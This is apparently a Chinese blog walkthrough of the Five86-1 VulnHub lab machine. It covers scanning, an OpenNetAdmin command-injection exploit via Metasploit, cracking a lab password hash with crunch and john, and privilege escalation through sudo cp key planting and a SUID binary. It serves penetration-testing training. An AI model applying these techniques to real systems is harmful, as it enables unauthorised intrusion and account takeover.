---
title: "Five86-1-Vulnhub Walkthrough"
categories: [ "安全技术" ]
tags: [ "vulnhub","靶机","walkthrough" ]
draft: false
slug: "536"
date: "2020-03-29 15:21:00"
---

[靶机地址][1]

靶机难度：初级+

## 工具及漏洞信息

- netdiscover
- nmap
- gobuster
- OpenNetAdmin 命令注入
- crunch 根据给定字符生成字典
- john 字典破解 hash

## 0x01 信息收集

### 扫描靶机

`netdiscover`的`-r`参数扫描`192.168.1.0/16`或者路由器管理界面查看有线连接的设备得到靶机`ip`

`nmap`扫描主机及端口信息：

```
nmap -sS -A -n -T4 -p- 192.168.1.3
```

![][2]

靶机开放了`22`、`80`、`10000`三个端口，看了`80`端口发现是空白的，用`curl`确认：

![][3]

确实没有内容，再看一下`10000`端口：

![][4]

是`Webmin`，版本`MiniServ 1.920`

### 扫描目录

`gobuster`扫描网站目录：

```
gobuster dir -u http://192.168.1.3 -s 200,301,302,307,401,403 -t 100 -q -x .php,.txt,.html,.zip,.bak,.tar.gz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![][5]

发现有`robot.txt`和一个可疑`401`目录`/reports`，访问发现需要认证：

![][6]

`robots.txt`里面发现目录`/ona`，与`nmap`扫描吻合，访问；

![][7]

是`openNetAdmin v18.1.1`(一个`IP`网络系统和主机管理系统)

### 信息收集总结

目前收集到的主要信息如下：

- ssh 22 端口开放，是否考虑爆破
- Webmin MiniServ 1.920 10000 端口 是否存在可利用漏洞
- openNetAdmin v18.1.1 /ona 目录 是否存在可利用漏洞

## 0x02 OpenNetAdmin 漏洞

那就分别看看`Webmin`和`openNetAdmin`有没有能利用的漏洞：

[`exploit-db`][8]:

![][9]

![][10]

`searchsploit`:

![][11]

`OK`，那我开启`msf`搜索模块：

![][12]

可以看到，`msf`中并没有我们刚才搜到的`Unauthenticated RCE(Metasploit)`，`openNetAdmin`甚至一个都没有

那我们手动下载`exploit-db`上的`exploit`文件并移入`msf`的`exploit`数据库：

```
/usr/share/metasploit-framework/modules/exploits/
```

重启 Metasploit 就可以直接使用两个 exp 了，先使用`Webmin`的看一下：

![][13]

竟然只支持`Webmin<= 1.910`版本，那试下`openNetAdmin`:

![][14]

成功获取到`meterpreter`会话

## 0x03 普通用户提权

如果要从`meterpreter`进入`shell`记得用`Python`获取一个`tty`，不然有些命令是无法执行的

```
python -c 'import pty; pty.spawn("/bin/bash")' # 有些没有安装Python2，所以需要换成python3 -c
```

我这里先不进入，老规矩，查看下当前目录、网站目录、家目录：

![][15]

当前目录没啥，看下网站目录：

![][16]

在网站目录，我们刚才不能访问的`/reports`子目录中的`.htaccess`文件中找到提示

在`/var/www/.htpasswd`中找到如下提示：

```
douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1

# To make things slightly less painful (a standard dictionary will likely fail),
# use the following character set for this 10 character password: aefhrt
```

给出了一个用户名和密码的`hash`值，提示我们需要爆破，密码位数为 10 位，包含`aefhrt`这 6 个字符

用`kali`自带的工具`crunch`生成密码字典，`crunch`可以根据我们指定的字符以及最大最小个数创建字典

```
Usage: crunch <min> <max> [options]
```

于是我使用`crunch 10 10 aefhrt -o passwd`生成密码字典：

![][17]

再使用`john`来爆破`hash`:

```
echo '$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' > hash
john --wordlist=passwd hash
```

在经历了漫长的等待之后得到密码`fatherrrrr`，于是我们使用`douglas:`登录`ssh`:

```
douglas：fatherrrrr
ssh douglas@192.168.1.3
```

`sudo -l`查看当前用户的权限

![][18]

发现可以以`jen`的权限执行`cp`命令，于是准备切换到`jen`账户

## 0x04 提权 root

`ssh-keygen`生成密钥，将公钥拷贝到`/home/jen/.ssh`目录下，之后使用`jen`账户登录:

```
ssh-keygen -b 2048
cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_keys
```

![][19]

这个时候我们来到`/tmp`（临时目录）下给`authorized_keys`这个文件一个可执行权限

使用`sudo`以`jen`用户权限去执行 cp 命令，把刚刚生成的`authorized_keys`移动到`/home/jen/.ssh/`

```
chmod 777 /tmp/authorized_keys
sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh/
ssh jen@127.0.0.1
```

![][20]

这里登录`jen`账户的时候提示我们有一封邮件，在`/var/mail/`中找到了这封名为`jen`的邮件：

![][21]

从邮件得知了用户密码`Moss:Fire!Fire!`，`SSH`链接登陆之~

```
moss:Fire!Fire!
ssh moss@192.168.1.3
```

切换到`moss`账户后，又到了我熟悉的`SUID`提权，用`find`查看

```
find / -perm -u=s -type f 2>/dev/null
```

![][22]

发现了`SUID`权限的`/home/moss/.games/upyourgame`，好像是个游戏，去玩一下：

![][23]

啥狗屁逻辑，就是刁难一下你，然后直接给了`root`权限，最后在`root`目录成功拿到`flag`:

![][24]

本文完。

参考文章：

- [VulnHub 靶机系列实战教程][25]
- [VulnHub 通关日记-five86-1-Walkthrough][26]
- [five86 1 walkthrough vulnhub ctf][27]

[1]: https://www.vulnhub.com/entry/five86-1,417/
[2]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_153046.png
[3]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_153440.png
[4]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_160139.png
[5]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_154902.png
[6]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_155044.png
[7]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_155418.png
[8]: https://www.exploit-db.com/
[9]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_160948.png
[10]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_161037.png
[11]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_160850.png
[12]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_161840.png
[13]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_162901.png
[14]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_163312.png
[15]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_163845.png
[16]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_164135.png
[17]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_165047.png
[18]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_170809.png
[19]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_171028.png
[20]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_171522.png
[21]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_171755.png
[22]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_172356.png
[23]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_172520.png
[24]: https://img.soapffz.com/archives_img/2020/03/29/archives_20200329_172701.png
[25]: https://mp.weixin.qq.com/s/skCNWPiEPgJcHXSmsif5qQ
[26]: https://mp.weixin.qq.com/s/OSXz-2SvcOexSkUZZDvWIw
[27]: https://www.hacknos.com/five86-1-walkthrough-vulnhub-ctf/